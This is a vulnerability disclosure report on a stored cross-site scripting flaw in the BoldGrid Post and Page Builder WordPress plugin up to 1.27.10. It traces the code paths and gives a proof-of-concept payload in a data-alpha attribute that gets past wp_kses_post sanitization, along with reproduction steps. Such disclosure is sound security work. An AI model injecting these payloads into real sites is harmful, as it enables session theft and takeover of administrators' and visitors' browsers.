# Post and Page Builder by BoldGrid – Visual Drag and Drop Editor <= 1.27.10 - Contributor+ Stored Cross-Site Scripting via data-alpha Attribute

## Timeline

- 30/5/2026 - Submission to Wordfence
- 9/6/2026 - The vendor released a patched version of the plugin (v1.27.11).
- 21/8/2026 - Wordfence marked as not eligible for a CVE ID because "Already patched in version 1.27.11"

## Software Details

| Key              | Value                                                           |
| ---------------- | --------------------------------------------------------------- |
| Software Name    | Post and Page Builder by BoldGrid – Visual Drag and Drop Editor |
| Software Slug    | post-and-page-builder                                           |
| Software URL     | https://wordpress.org/plugins/post-and-page-builder/            |
| Affected Version | <= 1.27.10                                                      |
## Description

A Stored Cross-Site Scripting (XSS) vulnerability exists in the Post and Page Builder by BoldGrid – Visual Drag and Drop Editor WordPress plugin due to unsafe HTML string construction from the `data-alpha` attribute. Both the editor script (`assets/js/editor/editor.js`, `adjust_overlay_colors()`) and the front-end script (`assets/js/public.js`, `addPaletteAlphas()`) read the `data-alpha` value of background elements from the DOM and concatenate it, without HTML encoding, into a CSS/`<style>` string that is ultimately parsed by jQuery as HTML.

In the editor, the decoded `data-alpha` value (read via `.attr('data-alpha')`) is concatenated into an inline` <style>…</style>` string passed to `$head.append()`. A payload that closes the `<style>` element and opens a script — e.g., `</style><script>alert(document.cookie)</script>` — causes jQuery to create and execute a live `<script>` node in the editor iframe. On the front end, the decoded value (read via `.data('alpha')`) is concatenated into a CSS string passed to `$style.html();` because the string contains the substring `<script`, jQuery routes the assignment through `this.empty().append(value)`, which parses it in a neutral context and executes the embedded script.

Reaching each sink has an additional requirement on the stored element: the editor-context sink requires the element to carry a `colorN-background-color` class (so the function's `bgClass` match succeeds and a palette color resolves), while the front-end sink requires a `data-bg-uuid` attribute (the front-end loop selects on `[data-bg-uuid]`). An element carrying the `colorN-background-color` class, a `data-bg-uuid` attribute, and the crafted data-alpha value therefore triggers in both contexts.

Server-side sanitization (`wp_kses_post`) does not mitigate this. WordPress globally allows `data-*` attributes in `wp_kses_post`, so the payload is stored as a harmless entity-encoded value — e.g., `data-alpha="&lt;/style&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;"` — and passed through unchanged. The browser decodes it back into the live DOM attribute at render time, and the plugin then reads that decoded value and re-injects it as raw HTML. This encode-decode-re-inject cycle is what bypasses sanitization.

Any user with `edit_posts` capability (Contributor role or higher) can supply the crafted payload through raw post_content (classic editor Text view, the REST API with status=pending, or any path placing arbitrary attributes into the content). TinyMCE serializes it to encoded form and `wp_kses_post` persists it.

The injected JavaScript executes in two distinct contexts. In the editor, `adjust_overlay_colors()` runs it in the browser of any user — including Editors and Administrators — who opens the affected post. Independently, once the post is published, the front-end script `addPaletteAlphas()` runs the equivalent pattern on every page view, executing the payload in the browser of every visitor, including unauthenticated users. A single Contributor-stored payload therefore yields both a privilege-escalating admin-context stored XSS and a site-wide stored XSS.

## Implications

A Contributor-level user can store JavaScript via the data-alpha attribute that executes in the browser of every visitor to the published post and any admin who opens it in the editor.

## Vulnerability Type

Stored Cross-Site Scripting

## Authentication Level Required

Contributor+


## PoC Video




## References to Affected Code

1. The attacker stores raw post content containing a background element with a crafted `data-alpha` value. A `colorN-background-color` class is additionally required to reach the editor-context sink, and a `data-bg-uuid` attribute to reach the front-end sink; the `data-alpha` value is machine-generated during normal use (by the Background Color transparency feature), never user-typed, so it is supplied directly through stored markup:

> https://plugins.trac.wordpress.org/browser/post-and-page-builder/tags/1.27.10/assets/js/builder/controls/element/background-legacy.js#L706
```js
paletteAddAlpha( $target, value, bgColorClass ) {
    ...
    // data-alpha is set programmatically by the background color/transparency control, not a user-editable field
    $target.attr( 'data-alpha', alphaFromColor );
    ...
},
```

2. When the post is saved, TinyMCE serializes the editor DOM to HTML, HTML-encoding the attribute value (e.g., < → &lt;, > → &gt;, " → &quot;). WordPress applies wp_kses_post to the submitted content. Because data-* is a globally allowed attribute in wp_kses_post, the attribute and its encoded value pass through unchanged and are persisted to the database:

```html
<!-- stored in wp_posts.post_content -->
<div class="color1-background-color" data-bg-uuid="uuid" data-alpha="&lt;/style&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;">x</div>
```

3. When the content is rendered into either the editor iframe or the published page, the browser parses the HTML and decodes the entity-encoded attribute value, so the live DOM attribute holds the fully decoded raw string:
```js
$('div').attr('data-alpha')  ->  </style><script>alert(document.cookie)</script>
```

4. Editor context. Rendering the content into the editor fires the TinyMCE `SetContent` event, which automatically invokes `adjust_overlay_colors()`. The function selects every `[data-alpha]` element, reads the decoded `data-alpha` value, concatenates it into the color value and then into an inline `<style>…</style>` string, and passes that string to jQuery's `.append()` against the editor iframe `<head>`. jQuery parses the string as HTML; the `</style>` terminates the style node and the following `<script>` is created and executed:
> https://plugins.trac.wordpress.org/browser/post-and-page-builder/tags/1.27.10/assets/js/editor/editor.js#L392
```js
//When content is added to editor
editor.on( 'SetContent', function( e ) {
    self.reset_anchor_spaces( tinymce.activeEditor.getBody(), true );
    self.adjust_overlay_colors( tinymce.activeEditor.getBody() );   // fires on every content load
    ...
} );
```

> https://plugins.trac.wordpress.org/browser/post-and-page-builder/tags/1.27.10/assets/js/editor/editor.js#L946
```js
this.adjust_overlay_colors = function( markup ) {
    var $markup = $( markup ),
	    $alphaOverlayElements = $markup.find( '[data-bg-overlaycolor-alpha]' );
        $alphaBgElements = $markup.find( '[data-alpha]' );           // selects attacker element

    $alphaBgElements.each( function() {
        var $this       = $( this ),
            classString = $this.attr( 'class' ),
            bgClass     = classString.match( /color[\d|\-|\w]*-background-color/ ),
            uuid        = $this.attr( 'data-bg-uuid' ),
            alpha       = $this.attr( 'data-alpha' ),                 // decoded raw string: </style><script>...</script>
            $head       = $( tinyMCE.activeEditor.iframeElement )
	            .contents()
	            .find( 'head' ),
            styleString,
            palettePosition,
            color;

            if ( ! bgClass ) {
	            return;
	        }

            palettePosition = bgClass[0].replace( 'color', '' ).replace( '-background-color', '' );
			palettePosition = palettePosition.replace( '-', '' );

			if ( 'neutral' !== palettePosition ) {
				color = BoldgridEditor.colors.defaults[ parseInt( palettePosition ) - 1 ];
			} else {
				color = BoldgridEditor.colors.neutral;
			}

            color = color.replace( ')', ',' + alpha + ')' );          // alpha concatenated into rgba()
            color = color.replace( 'rgb', 'rgba' );
            
            styleString = 'background-color: ' + color + ' !important;';

            // styleString embedded in HTML and parsed by jQuery append -> </style> breaks out, <script> executes
            $head.append( '<style id="' + uuid + '-inline-styles">body .' + uuid + ' { ' + styleString + ' }</style>' );
    } );
    ...
};
```

5. Front-end context. When the poisoned post is published and viewed, the front-end script (enqueued via `front_end()` in `includes/class-boldgrid-editor-assets.php:205`) runs `addPaletteAlphas()`, which reads the decoded `data-alpha` value via `.data('alpha')`, concatenates it into a CSS string, and passes it to `$style.html()`. Because the string contains the substring `<script`, jQuery's `.html()` falls back to `this.empty().append(value)` — parsing the string in a neutral context and executing the embedded script for every visitor, including unauthenticated users:
> https://plugins.trac.wordpress.org/browser/post-and-page-builder/tags/1.27.10/assets/js/public.js#L64
```js
addPaletteAlphas() {
    var $bgAlphaElements = $( '[data-bg-uuid]' ),
	    postImageHeaders = $( '.main .post > header' );

    $bgAlphaElements.each( function() {
        var $this  = $( this ),
            uuid   = $this.data( 'bg-uuid' ),
            $style = $( `<style id="${uuid}-inline-css"></style>` ),
            bgColor = $this.css( 'background-color' ),                 // computed value, always rgb(...)/rgba(...)
            css = '';

        bgColor = bgColor.replace( ')', ',' + $this.data( 'alpha' ) + ')' );  // decoded data-alpha concatenated in

        css += `.${uuid} { background-color: ${bgColor} !important; }`;       // css contains </style><script>...</script>

        $style.html( css );   // value contains "<script" -> jQuery routes via this.empty().append(value) -> script executes

        $( 'head' ).append( $style );
    } );
    ...
}
```

> Note: the front-end path executes only when the `data-alpha` payload contains the literal substring `<script` (or `<style`/`<link`), which forces jQuery's `.html()` to parse via `.append()`. An <img onerror> payload would fire in the editor but not on the front end, where `.html()` would instead assign it as inert raw text inside the `<style>` element. The `</style><script>…</script>` payload above executes in both contexts.


## Remediation

Update the plugin to version 1.27.11 or later.


## Preconditions

1. Setup WordPress environment with (PHP v8.2.29, MySQL 8.0.35, and WordPress 7.0)
2. "Post and Page Builder by BoldGrid – Visual Drag and Drop Editor" plugin is installed
3. The default plugin setup is performed (Click **Skip Setup** will automatically set it to default)

## Steps to Reproduce

1. Log in as a Contributor (or higher), navigate to **Posts**, **Add Post**.
2. Open the editor's Code View (Text view), insert the following payload into the post content, and click **Submit for Review**:
```html
<div class="color1-background-color" data-bg-uuid="uuid" data-alpha='&lt;/style&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;'>3l5h0pky</div>
```

![poc-1](./screenshots/stored-xss-data-bg-uuid-1.png)


3. Log in as an **Administrator** or **Editor**, navigate to **Posts** ->  **All Posts**, then open the submitted post for editing. Observe the payload execute automatically when the post loads into the editor.

![poc-2](./screenshots/stored-xss-data-bg-uuid-2.png)

4. Publish the post and visit its public URL. Observe the payload execute on page load as well. Confirming it fires not only in the editor but for every visitor of the published post.

![poc-3](./screenshots/stored-xss-data-bg-uuid-3.png)